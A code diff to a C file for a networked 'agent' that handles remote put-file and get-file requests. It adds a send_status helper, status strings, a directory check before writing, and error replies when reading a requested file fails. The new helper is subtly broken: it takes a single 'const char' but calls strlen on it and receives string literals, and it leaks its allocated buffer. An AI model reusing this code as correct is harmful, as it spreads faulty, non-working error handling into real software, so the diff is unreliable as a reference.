@@ -27,6 +27,23 @@ extern volatile sig_atomic_t agent_close_flag;
 // Connected flag
 extern volatile sig_atomic_t agent_disconnect_flag;
 
+// Status messages
+#define STATUS_FILE_EXIST	"file doesn't exist"
+#define STATUS_PATH_EXIST	"path doesn't exist"
+#define STATUS_ERROR		"agent error"
+
+STATIC int send_status(const char status){
+	char* buffer;
+	int len;
+
+	len = strlen(status);
+	buffer = calloc(1, len + 1);
+	memcpy(buffer, status, len);
+	
+	agent_prepare_message(TYPE_GET_FILE, buffer, len + 1);
+	return RET_OK;
+}
+
 STATIC int agent_handle_command(Assembled_Message* a_message){
 	Queue_Message* message = malloc(sizeof(Queue_Message));
 	memset(message, 0, sizeof(Queue_Message));
@@ -52,6 +69,11 @@ STATIC int agent_handle_put_file_name(Assembled_Message* a_message){
 
 STATIC int agent_handle_put_file(Assembled_Message* a_message){
 	FILE* file_fd;
+
+	if (check_directory(a_message->file_name, a_message->last_header.total_size) != RET_OK){
+		debug_print("%s\n", "directory does not exist");
+		return RET_ERROR;
+	}
 
 	// TODO check if path exists
 	if ((file_fd = fopen(a_message->file_name, "wb")) == 0){
@@ -80,22 +102,25 @@ STATIC int agent_handle_get_file_name(Assembled_Message* a_message){
 	const char slash = '/';
 
 	if (access(a_message->message, F_OK)){
-		debug_print("%s\n", "File doesn't exist");
-		//TODO send status message
-		return RET_OK;
+		debug_print("%s\n", "get file that doesn't exist");
+		send_status(STATUS_FILE_EXIST);
+		return RET_ERROR;
 	}
 
 	if ((file_fd = fopen(a_message->message, "rb")) == 0){
 		printf("ERROR file open\n");
+		send_status(STATUS_ERROR);
 		return RET_ERROR;
 	}
 
 	if (fseek(file_fd, 0L, SEEK_END) == -1){
 		printf("ERROR fseek\n");
+		send_status(STATUS_ERROR);
 		return RET_ERROR;
 	}
 	if ((file_size = ftell(file_fd)) == -1){
 		printf("ERROR ftell\n");
+		send_status(STATUS_ERROR);
 		return RET_ERROR;
 	}
 	rewind(file_fd);
@@ -105,6 +130,7 @@ STATIC int agent_handle_get_file_name(Assembled_Message* a_message){
 	bytes_read = fread(file_buffer, 1, file_size, file_fd);
 	if (bytes_read != file_size || ferror(file_fd)){
 		printf("ERROR fread\n");
+		send_status(STATUS_ERROR);
 		return RET_ERROR;
 	}
 	
@@ -127,6 +153,7 @@ STATIC int agent_handle_get_file_name(Assembled_Message* a_message){
 		free(a_message->message);
 		a_message = NULL;
 	}
+
 	agent_prepare_message(TYPE_GET_FILE, file_buffer, file_size);
 
 	return RET_OK;
